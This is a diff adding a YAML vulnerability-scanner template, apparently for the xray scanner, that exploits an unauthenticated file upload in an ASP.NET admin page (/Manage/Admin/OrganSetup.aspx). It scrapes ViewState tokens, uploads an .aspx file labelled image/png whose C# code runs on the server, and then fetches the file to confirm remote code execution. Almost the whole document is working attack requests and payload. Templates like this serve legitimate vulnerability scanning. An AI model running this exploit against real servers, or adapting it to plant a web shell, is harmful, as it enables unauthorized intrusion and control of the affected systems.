@@ -1,0 +1,165 @@
+name: poc-yaml-file-upload-rce
+transport: http
+set:
+  rfilename: randomLowercase(4)
+  s1: randomInt(40000, 44800)
+  s2: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Manage/Admin/OrganSetup.aspx
+    expression: >-
+      response.status == 200 && 
+      response.body_string.contains("__EVENTVALIDATION") && 
+      response.body_string.contains("__VIEWSTATE")
+    output:
+      search1: |
+        "__VIEWSTATE\" value=\"(?P<vie>.+?)\"".bsubmatch(response.body)
+      search2: |
+        "__EVENTVALIDATION\" value=\"(?P<eve>.+?)\"".bsubmatch(response.body)
+      vie: search1['vie']
+      eve: search2['eve']
+  r1:
+    request:
+      method: POST
+      path: /Manage/Admin/OrganSetup.aspx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: >-
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+        {{vie}}
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+
+        B81C8FAF
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+
+        {{eve}}
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$Org_PlatformName"
+
+
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$Org_ICP"
+
+
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$tbQrColor"
+
+
+        #004a80
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$cbQrCodeImg"
+
+
+        on
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$fuQrCenter";
+        filename=""
+
+        Content-Type: application/octet-stream
+
+
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$Org_QrCodeUrl"
+
+
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$fuLoad";
+        filename="{{rfilename}}.aspx"
+
+        Content-Type: image/png
+
+
+        <%@Page Language="C#"%>
+
+        <%Response.Write({{s1}}*{{s2}});System.IO.File.Delete(Request.PhysicalPath);%>
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$btnLogo"
+
+
+        1
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$cbIsVerifyTeahcer"
+
+
+        on
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$cbIsVerifyStudent"
+
+
+        on
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$ddlQscale"
+
+
+        7
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$Org_Keywords"
+
+
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$Org_Description"
+
+
+
+        ------WebKitFormBoundary{{rboundary}}
+
+        Content-Disposition: form-data; name="ctl00$cphMain$Org_Extracode"
+
+
+
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200 && response.body_string.contains("操作成功")
+    output:
+      search: |
+        "(?P<filename>[-\\d]+).aspx".bsubmatch(response.body)
+      uploadfilename: search["filename"]
+  r2:
+    request:
+      method: GET
+      path: /Upload/Org/{{uploadfilename}}.aspx
+    expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
+expression: r0() && r1() && r2()
+detail:
+  author: k3ppf0r
+  links: []
